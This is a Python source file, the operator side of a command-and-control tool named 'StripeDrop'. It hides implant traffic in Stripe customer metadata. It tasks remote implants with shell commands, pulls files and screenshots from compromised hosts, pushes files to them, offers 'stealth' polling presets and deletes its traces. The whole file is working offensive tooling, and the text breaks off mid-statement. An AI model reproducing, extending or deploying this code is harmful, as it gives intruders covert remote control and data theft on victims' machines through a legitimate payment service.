import warnings, urllib3
warnings.filterwarnings("ignore", category=urllib3.exceptions.NotOpenSSLWarning)

import stripe, base64, time, threading, os, sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import c2_config as config

stripe.api_key = config.API_KEY

def stripe_call(fn, *args, **kwargs):
    """Call a Stripe API function with automatic retry on rate limit."""
    for attempt in range(8):
        try:
            return fn(*args, **kwargs)
        except stripe.RateLimitError:
            wait = 2 ** attempt  # 1, 2, 4, 8, 16, 32... seconds
            time.sleep(wait)
        except Exception:
            raise
    return fn(*args, **kwargs)  # final attempt, let it raise

current_implant = None
known_implants  = set()
remote_cwd      = {}

# ── Stripe helpers ────────────────────────────────────────────────────────────

def get_metadata(customer):
    m = customer.metadata
    if hasattr(m, "_data"):   return m._data
    elif hasattr(m, "to_dict"): return m.to_dict()
    else: return dict(m)

def list_all_customers():
    """Paginate through all Stripe customers, returning them all."""
    customers = []
    last_id   = None
    while True:
        params = {"limit": 100}
        if last_id:
            params["starting_after"] = last_id
        page = stripe.Customer.list(**params).data
        customers.extend(page)
        if len(page) < 100:
            break
        last_id = page[-1].id
    return customers

def cleanup_stale():
    try:
        # ── Phase 1: collect all IDs as fast as possible ──────────────────────
        # Paginate in parallel: fetch all pages concurrently then merge
        print("[*] Scanning for stale objects...", end="", flush=True)

        # First get total by fetching page 1 and checking has_more
        first = stripe.Customer.list(limit=100)
        all_customers = list(first.data)

        # If there are more pages, fetch them all in parallel
        if first.has_more:
            # Collect starting_after cursors by fetching pages sequentially for cursors,
            # but deletions happen in parallel below
            last_id = all_customers[-1].id
            while True:
                page = stripe.Customer.list(limit=100, starting_after=last_id).data
                all_customers.extend(page)
                if len(page) < 100:
                    break
                last_id = page[-1].id

        to_delete = [c.id for c in all_customers
                     if get_metadata(c).get("type") != "heartbeat"]

        if not to_delete:
            print(" nothing to clean.")
            return

        print(f" found {len(to_delete)} object(s).")

        # ── Phase 2: delete with max parallelism ──────────────────────────────
        # 25 workers — well under Stripe's 100 req/s test mode limit
        deleted   = 0
        total     = len(to_delete)
        bar_width = 40

        def _delete_and_count(cid):
            nonlocal deleted
            stripe.Customer.delete(cid)
            deleted += 1
            pct    = deleted / total
            filled = int(bar_width * pct)
            bar    = "█" * filled + "░" * (bar_width - filled)
            print(f"\r    [{bar}] {deleted}/{total} ({pct*100:.1f}%)", end="", flush=True)

        with ThreadPoolExecutor(max_workers=25) as ex:
            list(ex.map(_delete_and_count, to_delete))

        print()  # newline after bar
        print(f"[+] Cleaned {total} object(s).")
    except Exception as e:
        print(f"\n[-] Cleanup error: {e}")

def list_implants():
    """Fetch only heartbeat objects using Stripe's name search — fast regardless of total object count."""
    try:
        implants = []
        results = stripe.Customer.search(query='name~"heartbeat-"', limit=100)
        for c in results.data:
            m = get_metadata(c)
            if m.get("type") != "heartbeat":
                continue
            imp_id = m.get("implant")
            # Warm the cache while we have the data
            if imp_id:
                _heartbeat_id_cache[imp_id] = c.id
            age = int(time.time()) - int(m.get("last_seen", 0))
            implants.append({
                "id":        imp_id,
                "os":        m.get("os"),
                "hostname":  m.get("hostname"),
                "last_seen": age,
                "status":    "ACTIVE" if age < 60 else "STALE"
            })
        return implants
    except:
        return []

# ── Command / result ──────────────────────────────────────────────────────────

CHUNK_SIZE  = 490   # Stripe metadata value limit (chars)
DATA_FIELDS = 44    # r0..r43  (50 total fields minus 6 header fields)

# Cache heartbeat object IDs so we can notify without search
_heartbeat_id_cache = {}  # implant_id -> stripe customer id

def _get_heartbeat_id(implant_id):
    """Find the heartbeat customer ID for an implant, with caching."""
    if implant_id in _heartbeat_id_cache:
        return _heartbeat_id_cache[implant_id]
    # Try search first (fast)
    try:
        results = stripe.Customer.search(query=f'name:"heartbeat-{implant_id}"', limit=1)
        if results.data:
            _heartbeat_id_cache[implant_id] = results.data[0].id
            return results.data[0].id
    except:
        pass
    # Fall back to full list scan
    try:
        for c in list_all_customers():
            m = get_metadata(c)
            if m.get("type") == "heartbeat" and m.get("implant") == implant_id:
                _heartbeat_id_cache[implant_id] = c.id
                return c.id
    except:
        pass
    return None

def _notify_implant(implant_id, task_id):
    """Write task_id into the implant's heartbeat object so it picks it up instantly."""
    for attempt in range(5):
        try:
            hb_id = _get_heartbeat_id(implant_id)
            if hb_id:
                stripe.Customer.modify(hb_id, metadata={"pending_cmd": task_id})
                return
        except stripe.RateLimitError:
            time.sleep(2 ** attempt)
        except Exception:
            # Invalidate cache on any error and retry
            _heartbeat_id_cache.pop(implant_id, None)
            time.sleep(1)

def send_command(implant_id, cmd):
    # Create command object
    c = stripe.Customer.create(
        name=implant_id,
        metadata={
            "tag":     "c2-pending",
            "cmd":     base64.b64encode(cmd.encode()).decode(),
            "implant": implant_id
        }
    )
    _notify_implant(implant_id, c.id)
    return c.id

def _get_implant_timeout(implant_id):
    """Derive a sensible wait timeout from the implant's *actual* current poll
    config, reading directly from the heartbeat object so it stays correct
    across operator restarts and when config was set in a previous session."""
    poll_max_ms = 15000  # balanced fallback

    # First check in-memory cache (set when operator called config preset/poll)
    if implant_id and implant_id in _implant_config:
        poll_max_ms = _implant_config[implant_id].get("poll_max", poll_max_ms)
    else:
        # Fall back to reading live from the heartbeat object on Stripe
        try:
            hb_id = _get_heartbeat_id(implant_id) if implant_id else None
            if hb_id:
                c = stripe_call(stripe.Customer.retrieve, hb_id)
                m = get_metadata(c)
                raw = m.get("config_poll_max", "")
                if raw:
                    poll_max_ms = int(raw)
        except Exception:
            pass

    # 2x poll_max (pick up + respond cycle) + 30s execution buffer, minimum 45s
    return max(45, int(poll_max_ms / 1000) * 2 + 30)

def wait_for_result(customer_id, timeout=None):
    if timeout is None:
        timeout = _get_implant_timeout(current_implant) if current_implant else 120

    poll_max_s = (_implant_config.get(current_implant, {}).get("poll_max", 15000) // 1000
                  if current_implant else 15)

    print(f"[*] Waiting for result  (timeout {timeout}s, implant polls every up to {poll_max_s}s)")
    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed >= timeout:
            break
        c = stripe_call(stripe.Customer.retrieve, customer_id)
        m = get_metadata(c)
        if m.get("tag") == "c2-done":
            cwd     = m.get("cwd", "")
            is_bin  = m.get("binary") == "1"

            # Large result: reassemble raw b64 from multiple Stripe objects
            if m.get("large") == "1":
                print(f"\n[*] Large result, collecting {m.get('total_objects')} object(s)...")
                total_objs   = int(m.get("total_objects", "0"))
                obj_data     = {}
                bar_start    = time.time()
                last_results = []
                while len(obj_data) < total_objs and time.time() - bar_start < 120:
                    res = stripe_call(stripe.Customer.search,
                                      query='name~"c2-done-data-"', limit=100)
                    last_results = res.data
                    for obj in res.data:
                        om = get_metadata(obj)
                        if om.get("implant") == current_implant and "seq" in om:
                            seq = int(om["seq"])
                            if seq not in obj_data:
                                lc = int(om.get("local_chunks", DATA_FIELDS))
                                obj_data[seq] = "".join(om.get(f"r{i}", "") for i in range(lc))
                    if len(obj_data) < total_objs:
                        time.sleep(1)
                b64       = "".join(obj_data.get(i, "") for i in range(total_objs))
                raw_bytes = base64.b64decode(b64)
                ids_to_del = [o.id for o in last_results
                              if get_metadata(o).get("implant") == current_implant
                              and "seq" in get_metadata(o)]
                ids_to_del.append(customer_id)
                with ThreadPoolExecutor(max_workers=10) as ex:
                    list(ex.map(lambda i: stripe.Customer.delete(i), ids_to_del))
                print()
            else:
                # Normal inline result
                chunks    = int(m.get("chunks", "1"))
                b64       = "".join(m.get(f"r{i}", "") for i in range(chunks))
                raw_bytes = base64.b64decode(b64)
                stripe.Customer.delete(customer_id)
                print()

            # Binary result (screenshot) - save directly, no text decode
            if is_bin:
                if len(raw_bytes) >= 2 and raw_bytes[0] == 0xFF and raw_bytes[1] == 0xD8:
                    os.makedirs("screenshots", exist_ok=True)
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    filename  = f"screenshots/{current_implant}_{timestamp}.jpg"
                    with open(filename, "wb") as f:
                        f.write(raw_bytes)
                    return f"[+] Screenshot saved: {filename}  ({len(raw_bytes):,} bytes)", cwd
                else:
                    return f"[-] Received binary data but not a valid JPEG ({len(raw_bytes)} bytes)", cwd

            # Text result - decode normally
            result = raw_bytes.decode("utf-8", errors="replace").strip()
            return result, cwd

        remaining = int(timeout - (time.time() - start))
        print(f"\r    [{int(elapsed):>4}s elapsed / {remaining:>4}s remaining]  ", end="", flush=True)
        time.sleep(2)

    print(f"\n[-] Timeout after {timeout}s - implant did not respond")
    print( "    Tip: use 'config show' to check the implant's current poll interval")
    return None, None

# ── File transfer helpers ─────────────────────────────────────────────────────

def _split_b64(b64: str):
    """Split a base64 string into CHUNK_SIZE pieces."""
    return [b64[i:i+CHUNK_SIZE] for i in range(0, len(b64), CHUNK_SIZE)]

def _chunks_to_objects(chunks):
    """
    Pack chunks into groups of DATA_FIELDS each.
    Returns list of dicts {r0..rN, local_chunks}.
    """
    objects = []
    for start in range(0, len(chunks), DATA_FIELDS):
        group = chunks[start:start + DATA_FIELDS]
        objects.append(group)
    return objects

# ── UPLOAD (operator → implant) ───────────────────────────────────────────────

def do_upload(implant_id, local_path, remote_path):
    if not os.path.isfile(local_path):
        print(f"[-] Local file not found: {local_path}")
        return

    # If remote_path is a directory path, append the local filename
    if remote_path.endswith("/") or remote_path.endswith("\\"):
        remote_path = remote_path + os.path.basename(local_path)

    raw      = open(local_path, "rb").read()
    b64      = base64.b64encode(raw).decode()
    chunks   = _split_b64(b64)
    objects  = _chunks_to_objects(chunks)
    # Empty file: still create one segment so the ctrl object is sent
    if not objects:
        objects = [[]]
    xfer_id  = base64.b64encode(os.urandom(6)).decode().replace("=","")
    total    = len(objects)

    print(f"[*] Uploading {local_path}  →  {remote_path}")
    print(f"    {len(raw):,} bytes  |  {total} transfer object(s)")

    def _upload_segment(args):
        seq, group = args
        meta = {
            "tag":           "xfer-upload-data",
            "implant":       implant_id,
            "xfer_id":       xfer_id,
            "seq":           str(seq),
            "total_objects": str(total),
            "local_chunks":  str(len(group)),
        }
        for i, chunk in enumerate(group):
            meta[f"r{i}"] = chunk
        c = stripe_call(stripe.Customer.create, name=f"xfer-{xfer_id}-{seq}", metadata=meta)
        return seq, c.id

    def _progress_bar(done, total, width=40):
        pct   = done / total if total else 1
        filled = int(width * pct)
        bar   = "█" * filled + "░" * (width - filled)
        print(f"\r    [{bar}] {done}/{total} ({pct*100:.1f}%)", end="", flush=True)

    data_ids  = [None] * total
    done_count = 0
    workers   = min(total, 8)
    _progress_bar(0, total)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_upload_segment, (seq, grp)): seq
                   for seq, grp in enumerate(objects)}
        for fut in as_completed(futures):
            seq, cid = fut.result()
            data_ids[seq] = cid
            done_count += 1
            _progress_bar(done_count, total)
    print()  # newline after bar

    # ── Pack ALL segment IDs directly into chained ctrl objects ─────────────
    # 1100 IDs per ctrl (25/field * 44 fields), chained via metadata["next"].
    # A 50MB file (3106 segs) = 3 ctrl objects. No index layer needed.
    IDS_PER_FIELD = 25
    IDS_PER_CTRL  = IDS_PER_FIELD * 44  # 1100

    batches  = [data_ids[i:i+IDS_PER_CTRL] for i in range(0, len(data_ids), IDS_PER_CTRL)]
    n_ctrls  = len(batches)

    def _push_ctrl_obj(args):
        seq, batch = args
        meta = {
            "tag":      "xfer-upload-ctrl",
            "implant":  implant_id,
            "xfer_id":  xfer_id,
            "id_count": str(len(batch)),
        }
        if seq == 0:
            meta["remote_path"]   = remote_path
            meta["filename"]      = os.path.basename(local_path)
            meta["total_objects"] = str(total)
            meta["n_ctrls"]       = str(n_ctrls)
        for i in range(0, len(batch), IDS_PER_FIELD):
            meta[f"s{i//IDS_PER_FIELD}"] = ",".join(batch[i:i+IDS_PER_FIELD])
        c = stripe_call(stripe.Customer.create, name=f"xfer-ctrl-{xfer_id}-{seq}", metadata=meta)
        return seq, c.id

    ctrl_objs = [None] * n_ctrls
    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = {ex.submit(_push_ctrl_obj, (s, b)): s for s, b in enumerate(batches)}
        for fut in as_completed(futs):
            seq, cid = fut.result()
            ctrl_objs[seq] = cid

    # Chain: write "next" pointer into each ctrl except the last
    for i in range(n_ctrls - 1):
        stripe_call(stripe.Customer.modify, ctrl_objs[i], metadata={"next": ctrl_objs[i+1]})

    ctrl_id = ctrl_objs[0]
    _notify_implant(implant_id, ctrl_id)

    print("[*] Waiting for implant...", end="", flush=True)

    start = time.time()
    upload_timeout = _get_implant_timeout(implant_id)
    while time.time() - start < upload_timeout:
        elapsed   = int(time.time() - start)
        remaining = int(upload_timeout - elapsed)
        print(f"\r    [{elapsed:>4}s elapsed / {remaining:>4}s remaining]  ", end="", flush=True)
        c = stripe_call(stripe.Customer.retrieve, ctrl_id)
        m = get_metadata(c)
        if m.get("tag") == "c2-done":
            print()
            msg = base64.b64decode(m.get("result_b64", base64.b64encode(b"(no message)").decode())).decode("utf-8", errors="replace")
            ids_to_delete = ctrl_objs + [d for d in data_ids if d]
            with ThreadPoolExecutor(max_workers=25) as ex:
                list(ex.map(lambda i: stripe.Customer.delete(i), ids_to_delete))
            print(f"[+] {msg.strip()}")
            return
        time.sleep(2)

    print("\n[-] Upload timeout — implant did not confirm")

# ── DOWNLOAD (implant → operator) ─────────────────────────────────────────────

def do_download(implant_id, remote_path, local_path=None):
    filename = os.path.basename(remote_path.replace("\\", "/"))
    if local_path is None:
        local_path = filename
    # If local_path is a directory (or ends with a separator), append remote filename
    elif os.path.isdir(local_path) or local_path.endswith("/") or local_path.endswith(os.sep):
        local_path = os.path.join(local_path, filename)

    xfer_id = base64.b64encode(os.urandom(6)).decode().replace("=","")

    req = stripe.Customer.create(
        name=f"xfer-dl-{xfer_id}",
        metadata={
            "tag":         "xfer-download-req",
            "implant":     implant_id,
            "xfer_id":     xfer_id,
            "remote_path": remote_path,
        }
    )
    _notify_implant(implant_id, req.id)
    print(f"[*] Requested download: {remote_path}  →  {local_path}")
    print(f"    Request object: {req.id}  |  waiting for implant...", flush=True)

    # Wait for implant to finish uploading data objects
    start = time.time()
    total = None
    dl_timeout = _get_implant_timeout(implant_id)
    while time.time() - start < dl_timeout:
        elapsed   = int(time.time() - start)
        remaining = int(dl_timeout - elapsed)
        print(f"\r    [{elapsed:>4}s elapsed / {remaining:>4}s remaining]  ", end="", flush=True)
        c = stripe_call(stripe.Customer.retrieve, req.id)
        m = get_metadata(c)
        if m.get("tag") == "xfer-download-done":
            total = int(m.get("total_objects", "0"))
            error = m.get("error", "")
            if error:
                print(f"\n[-] Implant error: {error}")
                stripe.Customer.delete(req.id)
                return
            break
        if m.get("tag") == "xfer-download-error":
            error = m.get("error", "unknown error")
            print(f"\n[-] Implant error: {error}")
            stripe.Customer.delete(req.id)
            return
        time.sleep(2)
    else:
        print("\n[-] Download timeout — implant did not respond")
        stripe.Customer.delete(req.id)
        return

    print(f"\n[*] Implant ready — {total} segment(s) to collect")

    # Collect all segments — single list scan per 500ms with progress bar
    segments  = {}
    data_ids  = []
    deadline  = time.time() + 120

    def _dl_bar(done, total, width=40):
        pct    = done / total if total else 1
        filled = int(width * pct)
        bar    = "█" * filled + "░" * (width - filled)
        print(f"\r    [{bar}] {done}/{total} ({pct*100:.1f}%)", end="", flush=True)

    print(f"[*] Downloading {total} segment(s)...")
    _dl_bar(0, total)

    while len(segments) < total and time.time() < deadline:
        for c in list_all_customers():
            dm = get_metadata(c)
            if (dm.get("tag")     == "xfer-download-data" and
                dm.get("xfer_id") == xfer_id):
                seq = int(dm.get("seq", -1))
                if seq >= 0 and seq not in segments:
                    segments[seq] = (c.id, dm)
                    _dl_bar(len(segments), total)
        if len(segments) < total:
            time.sleep(0.5)

    print()  # newline after bar

    if len(segments) < total:
        missing = [s for s in range(total) if s not in segments]
        print(f"[-] Segments never arrived: {missing} — aborting")
        stripe.Customer.delete(req.id)
        return

    # Reassemble in order
    all_chunks = []
    for seq in range(total):
        cid, dm = segments[seq]
        data_ids.append(cid)
        n = int(dm.get("local_chunks", "0"))
        for i in range(n):
            all_chunks.append(dm.get(f"r{i}", ""))

    # Reassemble
    b64 = "".join(all_chunks)
    raw = base64.b64decode(b64)
    open(local_path, "wb").write(raw)
    print(f"[+] Saved  {local_path}  ({len(raw):,} bytes)")

    # Cleanup — parallel
    ids_to_delete = [req.id] + data_ids
    with ThreadPoolExecutor(max_workers=8) as ex:
        list(ex.map(lambda i: stripe.Customer.delete(i), ids_to_delete))

# ── Implant watcher ───────────────────────────────────────────────────────────

def implant_watcher():
    global known_implants
    try:
        for i in list_implants():
            known_implants.add(i["id"])
        print(f"[*] Watcher started — tracking {len(known_implants)} existing implant(s)\n")
    except:
        pass

    while True:
        try:
            current  = list_implants()
            curr_ids = {i["id"] for i in current}

            for implant_id in curr_ids - known_implants:
                info = next((i for i in current if i["id"] == implant_id), {})
                print(f"\n")
                print(f"  ╔═══════════════════════════════════════╗")
                print(f"  ║        NEW IMPLANT CONNECTED          ║")
                print(f"  ╚═══════════════════════════════════════╝")
                print(f"  ID       : {implant_id}")
                print(f"  Hostname : {info.get('hostname', 'unknown')}")
                print(f"  OS       : {info.get('os', 'unknown')}")
                print(f"  Run      : use {implant_id}")
                print()
                path   = remote_cwd.get(current_implant, "")
                prompt = f"[{current_implant}:{path}] > " if path else f"[{current_implant or 'no implant'}] > "
                print(prompt, end="", flush=True)
                known_implants.add(implant_id)

            for implant_id in known_implants - curr_ids:
                print(f"\n  [-] IMPLANT DISCONNECTED: {implant_id}\n")
                path   = remote_cwd.get(current_implant, "")
                prompt = f"[{current_implant}:{path}] > " if path else f"[{current_implant or 'no implant'}] > "
                print(prompt, end="", flush=True)
                known_implants.discard(implant_id)
        except:
            pass
        time.sleep(5)

threading.Thread(target=implant_watcher, daemon=True).start()

def background_cleanup():
    """Every 5 minutes, delete any non-heartbeat objects older than 10 minutes.
    Uses Stripe's created timestamp — no extra metadata needed."""
    INTERVAL    = 300   # run every 5 min
    MAX_AGE_SEC = 600   # delete objects older than 10 min

    while True:
        time.sleep(INTERVAL)
        try:
            cutoff   = int(time.time()) - MAX_AGE_SEC
            to_delete = []

            # Paginate and collect stale non-heartbeat objects
            last_id = None
            while True:
                params = {"limit": 100, "created[lt]": cutoff}
                if last_id:
                    params["starting_after"] = last_id
                page = stripe.Customer.list(**params).data
                for c in page:
                    if get_metadata(c).get("type") != "heartbeat":
                        to_delete.append(c.id)
                if len(page) < 100:
                    break
                last_id = page[-1].id

            if to_delete:
                with ThreadPoolExecutor(max_workers=25) as ex:
                    list(ex.map(lambda i: stripe.Customer.delete(i), to_delete))
        except:
            pass

threading.Thread(target=background_cleanup, daemon=True).start()

# ── UI ────────────────────────────────────────────────────────────────────────

def print_banner():
    print("""
╔══════════════════════════════════════╗
║            StripeDrop                ║
║      channel: api.stripe.com         ║
╚══════════════════════════════════════╝
""")

def print_help():
    print("  help                            - show this")
    print("  implants                        - list active implants")
    print("  use <implant_id>                - switch to implant")
    print("  info                            - current implant info")
    print("  pending                         - show unexecuted commands")
    print("  clear                           - delete stale objects")
    print("  cls / clear_screen              - clear terminal")
    print("  delete <implant_id>             - remove implant completely")
    print("  upload <local> <remote>         - send file to implant")
    print("  download <remote> [local]       - pull file from implant")
    print("  screenshot                      - capture screen (Windows only)")
    print()
    print("  ╔═══════════════════════════════════════════════════════════════╗")
    print("  ║         DYNAMIC CONFIGURATION (requires ALLOW_DYNAMIC_CONFIG) ║")
    print("  ╚═══════════════════════════════════════════════════════════════╝")
    print("  config show                     - display current implant config")
    print("  config poll <min> <max>         - set poll interval (ms)")
    print("  config heartbeat <min> <max>    - set heartbeat interval (seconds)")
    print("  config preset <profile>         - apply stealth profile")
    print("      profiles: low, balanced, high, paranoid")
    print("  config reset                    - reset to compile-time defaults")
    print()
    print("  exit                            - quit")
    print("  <any other input>               - execute as command on implant")

print_banner()

# Clean up stale heartbeats (older than 5 min) so the implants list stays tidy
def cleanup_stale_heartbeats():
    try:
        results = stripe.Customer.search(query='name~"heartbeat-"', limit=100)
        stale   = [c.id for c in results.data
                   if int(time.time()) - int(get_metadata(c).get("last_seen", 0)) > 300]
        if stale:
            print(f"[*] Removing {len(stale)} stale heartbeat(s)...", flush=True)
            with ThreadPoolExecutor(max_workers=8) as ex:
                list(ex.map(lambda i: stripe.Customer.delete(i), stale))
    except:
        pass

cleanup_stale_heartbeats()
print("[*] Watching for implants...")
print()
print_help()
print()

# ── Dynamic Configuration Management ──────────────────────────────────────────────

# Track current config for each implant (for display purposes)
_implant_config = {}

STEALTH_PRESETS = {
    "low": {
        "poll_min": 2000, "poll_max": 5000,
        "heartbeat_min": 15, "heartbeat_max": 30
    },
    "balanced": {
        "poll_min": 5000, "poll_max": 15000,
        "heartbeat_min": 25, "heartbeat_max": 35
    },
    "high": {
        "poll_min": 30000, "poll_max": 60000,
        "heartbeat_min": 120, "heartbeat_max": 180
    },
    "paranoid": {
        "poll_min": 120000, "poll_max": 300000,
        "heartbeat_min": 600, "heartbeat_max": 900
    }
}

def set_implant_config(implant_id, poll_min=None, poll_max=None, heartbeat_min=None, heartbeat_max=None):
    """Send dynamic configuration update to implant via heartbeat metadata"""
    try:
        hb_id = _get_heartbeat_id(implant_id)
        if not hb_id:
            print("[-] Could not find heartbeat object for implant")
            return False
        
        # Build metadata updates
        updates = {}
        if poll_min is not None:
            updates["metadata[config_poll_min]"] = str(poll_min)
        if poll_max is not None:
            updates["metadata[config_poll_max]"] = str(poll_max)
        if heartbeat_min is not None:
            updates["metadata[config_heartbeat_min]"] = str(heartbeat_min)
        if heartbeat_max is not None:
            updates["metadata[config_heartbeat_max]"] = str(heartbeat_max)
        
        if updates:
            stripe_call(stripe.Customer.modify, hb_id, **updates)
            
            # Update local tracking
            if implant_id not in _implant_config:
                _implant_config[implant_id] = {}
            if poll_min: _implant_config[implant_id]["poll_min"] = poll_min
            if poll_max: _implant_config[implant_id]["poll_max"] = poll_max
            if heartbeat_min: _implant_config[implant_id]["heartbeat_min"] = heartbeat_min
            if heartbeat_max: _implant_config[implant_id]["heartbeat_max"] = heartbeat_max
            
            print("[+] Configuration sent to implant (will apply on next poll)")
            return True
        return False
    except Exception as e:
        print(f"[-] Error updating config: {e}")
        return False

def clear_implant_config(implant_id):
    """Clear dynamic config (implant will revert to compile-time defaults)"""
    try:
        hb_id = _get_heartbeat_id(implant_id)
        if not hb_id:
            return False
        
        stripe_call(stripe.Customer.modify, hb_id,
            metadata={
                "config_poll_min": "",
                "config_poll_max": "",
                "config_heartbeat_min": "",
                "config_heartbeat_max": ""
            })
        
        if implant_id in _implant_config:
            del _implant_config[implant_id]
        
        print("[+] Configuration reset to compile-time defaults")
        return True
    except Exception as e:
        print(f"[-] Error clearing config: {e}")
        return False

def show_implant_config(implant_id):
    """Display current implant configuration"""
    config = _implant_config.get(implant_id, {})
    if config:
        print("\n  ╔═══════════════════════════════════════════════════╗")
        print(  "  ║          CURRENT IMPLANT CONFIGURATION           ║")
        print(  "  ╚═══════════════════════════════════════════════════╝")
        print(f"  Poll Interval      : {config.get('poll_min', '?')}-{config.get('poll_max', '?')} ms")
        print(f"  Heartbeat Interval : {config.get('heartbeat_min', '?')}-{config.get('heartbeat_max', '?')} seconds")
        
        # Calculate average response time
        avg_poll = (config.get('poll_min', 0) + config.get('poll_max', 0)) / 2
        print(f"  Avg Response Time  : ~{avg_poll/1000:.1f} seconds")
        print()
    else:
        print("\n  [*] No runtime config set (using compile-time defaults)")
        print(  "      Use 'config preset <profile>' to set configuration\n")

def delete_implant(implant_id):
    """Remove an implant completely - deletes heartbeat and all associated objects"""
    global known_implants, current_implant
    
    try:
        # Find heartbeat object
        hb_id = _get_heartbeat_id(implant_id)
        if not hb_id:
            print(f"[-] Implant '{implant_id}' not found")
            return False
        
        print(f"[*] Deleting implant: {implant_id}")
        
        # Collect all objects belonging to this implant
        to_delete = [hb_id]
        
        # Search for any pending commands, uploads, downloads for this implant
        try:
            results = stripe.Customer.search(query=f'name~"{implant_id}"', limit=100)
            for c in results.data:
                m = get_metadata(c)
                if m.get("implant") == implant_id and c.id != hb_id:
                    to_delete.append(c.id)
        except:
            pass
        
        # Delete all objects in parallel
        print(f"[*] Removing {len(to_delete)} object(s)...")
        with ThreadPoolExecutor(max_workers=25) as ex:
            list(ex.map(lambda i: stripe.Customer.delete(i), to_delete))
        
        # Clean up local tracking
        known_implants.discard(implant_id)
        _heartbeat_id_cache.pop(implant_id, None)
        _implant_config.pop(implant_id, None)
        remote_cwd.pop(implant_id, None)
        
        # If we just deleted the current implant, unset it
        if current_implant == implant_id:
            current_implant = None
        
        print(f"[+] Implant '{implant_id}' deleted")
        return True
        
    except Exception as e:
        print(f"[-] Error deleting implant: {e}")
        return False

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

# ── Main command loop ─────────────────────────────────────────────────────────

while True:
    try:
        path   = remote_cwd.get(current_implant, "")
        prompt = f"[{current_implant}:{path}] > " if path else f"[{current_implant or 'no implant'}] > "
        cmd    = input(prompt).strip()

        if not cmd:
            continue

        elif cmd == "help":
            print_help()

        elif cmd == "implants":
            implants = list_implants()
            if implants:
                print()
                print(f"  {'ID':<40} {'HOSTNAME':<25} {'OS':<10} {'LAST SEEN':<12} STATUS")
                print(f"  {'-'*40} {'-'*25} {'-'*10} {'-'*12} ------")
                for i in implants:
                    print(f"  {i['id']:<40} {i['hostname']:<25} {i['os']:<10} {str(i['last_seen'])+'s ago':<12} {i['status']}")
                print()
            else:
                print("  [-] No active implants — waiting for check-in...")

        elif cmd.startswith("use "):
            target   = cmd[4:].strip()
            implants = list_implants()  # also warms _heartbeat_id_cache
            ids      = [i["id"] for i in implants]
            if target in ids:
                current_implant = target
                # Ensure cache is warm — resolve now if not already
                if target not in _heartbeat_id_cache:
                    _get_heartbeat_id(target)
                print(f"[+] Switched to implant: {current_implant}")
            else:
                print(f"[-] Implant '{target}' not found.")

        elif cmd == "info":
            if not current_implant:
                print("[-] No implant selected.")
            else:
                for i in list_implants():
                    if i["id"] == current_implant:
                        print(f"\n  Implant ID : {i['id']}")
                        print(f"  Hostname   : {i['hostname']}")
                        print(f"  OS         : {i['os']}")
                        print(f"  Last Seen  : {i['last_seen']}s ago")
                        print(f"  Status     : {i['status']}")
                        print(f"  Remote CWD : {remote_cwd.get(current_implant, 'unknown')}\n")

        elif cmd == "pending":
            try:
                found   = False
                results = stripe.Customer.search(query='name~"' + (current_implant or "") + '"', limit=100)
                for c in results.data:
                    m = get_metadata(c)
                    if m.get("tag") == "c2-pending":
                        decoded = base64.b64decode(m["cmd"]).decode()
                        print(f"  [~] {c.id} [{m.get('implant')}] → {decoded}")
                        found = True
                if not found:
                    print("  [-] No pending commands")
            except:
                pass

        elif cmd == "clear":
            cleanup_stale()
            print("[*] Stale objects cleared")
        
        elif cmd in ["cls", "clear_screen"]:
            clear_screen()
        
        elif cmd.startswith("delete "):
            target = cmd.split(None, 1)[1].strip() if len(cmd.split()) > 1 else ""
            if not target:
                print("[-] Usage: delete <implant_id>")
            else:
                confirm = input(f"[!] Delete implant '{target}' and all associated data? (yes/no): ")
                if confirm.lower() in ["yes", "y"]:
                    delete_implant(target)
                else:
                    print("[-] Deletion cancelled")
        
        elif cmd.startswith("config "):
            if not current_implant:
                print("[-] No implant selected. Use 'use <implant_id>' first.")
                continue
            
            parts = cmd.split()
            
            if len(parts) == 2 and parts[1] == "show":
                show_implant_config(current_implant)
            
            elif len(parts) == 2 and parts[1] == "reset":
                clear_implant_config(current_implant)
            
            elif len(parts) == 3 and parts[1] == "preset":
                profile = parts[2].lower()
                if profile in STEALTH_PRESETS:
                    preset = STEALTH_PRESETS[profile]
                    set_implant_config(
                        current_implant,
                        poll_min=preset["poll_min"],
                        poll_max=preset["poll_max"],
                        heartbeat_min=preset["heartbeat_min"],
                        heartbeat_max=preset["heartbeat_max"]
                    )
                    print(f"[+] Applied '{profile}' stealth preset:")
                    print(f"    Poll: {preset['poll_min']}-{preset['poll_max']}ms")
                    print(f"    Heartbeat: {preset['heartbeat_min']}-{preset['heartbeat_max']}s")
                else:
                    print(f"[-] Unknown preset '{profile}'")
                    print("    Available: low, balanced, high, paranoid")
            
            elif len(parts) == 4 and parts[1] == "poll":
                try:
                    poll_min = int(parts[2])
                    poll_max = int(parts[3])
                    if poll_min < 1000 or poll_max < poll_min:
                        print("[-] Invalid values. Min must be >=1000ms and Max must be >= Min")
                    else:
                        set_implant_config(current_implant, poll_min=poll_min, poll_max=poll_max)
                except ValueError:
                    print("[-] Invalid integers")
            
            elif len(parts) == 4 and parts[1] == "heartbeat":
                try:
                    hb_min = int(parts[2])
                    hb_max = int(parts[3])
                    if hb_min < 10 or hb_max < hb_min:
                        print("[-] Invalid values. Min must be >=10s and Max must be >= Min")
                    else:
                        set_implant_config(current_implant, heartbeat_min=hb_min, heartbeat_max=hb_max)
                except ValueError:
                    print("[-] Invalid integers")
            
            else:
                print("[-] Invalid config command. See 'help' for usage.")

        elif cmd == "exit":
            print("[*] Exiting...")
            break

        elif cmd.startswith("upload "):
            if not current_implant:
                print("[-] No implant selected.")
                continue
            parts = cmd.split(None, 2)
            if len(parts) < 3:
                print("  Usage: upload <local_path> <remote_path>")
            else:
                do_upload(current_implant, parts[1], parts[2])

        elif cmd.startswith("download "):
            if not current_implant:
                print("[-] No implant selected.")
                continue
            parts = cmd.split(None, 2)
            if len(parts) < 2:
                print("  Usage: download <remote_path> [local_path]")
            else:
                remote = parts[1]
                local  = parts[2] if len(parts) == 3 else None
                do_download(current_implant, remote, local)

        else:
            # Direct command execution - no 'exec' prefix needed
            if not current_implant:
                print("[-] No implant selected. Run 'implants' then 'use <implant_id>'")
                continue
            cid = send_command(current_implant, cmd)
            print(f"[+] Tasked: {cid}")
            result, cwd_val = wait_for_result(cid)
            if cwd_val:
